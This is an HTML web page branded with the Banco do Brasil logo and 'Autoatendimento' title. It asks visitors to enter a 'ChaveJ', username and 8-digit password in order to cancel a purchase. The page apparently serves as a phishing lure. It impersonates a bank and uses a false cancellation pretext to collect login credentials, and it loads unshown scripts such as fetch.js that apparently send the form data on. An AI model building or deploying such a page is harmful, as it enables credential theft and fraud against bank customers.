<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css" integrity="sha512-NmLkDIU1C/C88wi324HBc+S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/css/headers.css">
    <link rel="stylesheet" href="assets/css/headers/headers__logotype.css">
    <link rel="stylesheet" href="assets/css/headers/headers__logotype.css">
    <link rel="stylesheet" href="assets/css/headers/header__logo.css">
    <link rel="stylesheet" href="assets/css/headers/header__text.css">
    <link rel="stylesheet" href="assets/css/content.css">
    <link rel="stylesheet" href="assets/css/agency__account.css">
    <link rel="stylesheet" href="assets/css/agency__account/agency__account-title.css">
    <link rel="stylesheet" href="assets/css/forms.css">
    <link rel="stylesheet" href="assets/css/forms/forms__login.css">
    <link rel="stylesheet" href="assets/css/forms/form__login-description.css">
    <link rel="stylesheet" href="assets/css/forms/form__login-data.css">
    <link rel="stylesheet" href="assets/css/forms/form__login-required.css">
    <link rel="stylesheet" href="assets/css/switch.css">
    <link rel="stylesheet" href="assets/css/switch/switch__btn.css">
    <link rel="stylesheet" href="assets/css/btn.css">
    <link rel="stylesheet" href="assets/css/spinner.css">
    
    <title>Protótipo - Cancelamento</title>
</head>
<body>

    <header class="headers">
        <div class="headers__logotype">
            <a href="home"><img src="./assets/img/bancodobrasillogo.png" alt="Logo Banco do Brasil" class="header__logo" ></a>
            <h1 class="header__text">Autoatendimento</h1>
        </div>
    </header>

    <main class="content">
        <form class="agency__account">
            <h1 class="agency__account-title">Para realizar o cancelamento  da  sua<br>compra, informe os dados abaixo:</h1>
            <section class="forms">
                <div class="form__login">
                    <label for="keyj" class="form__login-description">ChaveJ</label>
                    <input required type="text" name="chavej" id="keyj" placeholder="ChaveJ" pattern="^([0-9]{5})$" class="form__login-data">
                    <p class="form__login-required">ChaveJ é um campo obrigatório</p>
                </div>
                <div class="form__login">
                    <label for="user" class="form__login-description">Usuário</label>
                    <input required type="text" name="user" id="user" placeholder="Usuário" pattern="/^[A-Za-z]+$/" class="form__login-data">
                    <p class="form__login-required">Informe seu usuario</p>
                </div>
                <div class="form__login">
                    <label for="password" class="form__login-description">Senha</label>
                    <input required type="password" name="password" id="passwordStrong" placeholder="Senha" pattern="^([0-9]{8})$" class="form__login-data">
                    <p class="form__login-required">Informe sua senha de 8 digitos</p>
                </div>
                <button type="submit" class="btn" id="triggerbtncnpj">Continuar</button>
            </section>
        </form>
        <div class="loading hide" id="spinner-hide">
            <div class="spinner">
                <div class="circle"></div>
            </div>
        </div>
    </main>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
<script src="./assets/JavaScript/service/checkLegal.js"></script>
<script src="./assets/JavaScript/service/checkSize.js"></script>
<script src="./assets/JavaScript/service/checkData.js"></script>
<script src="./assets/JavaScript/view/callSpinner.js"></script>
<script src="./assets/JavaScript/service/fetch.js"></script>
</body>
</html>
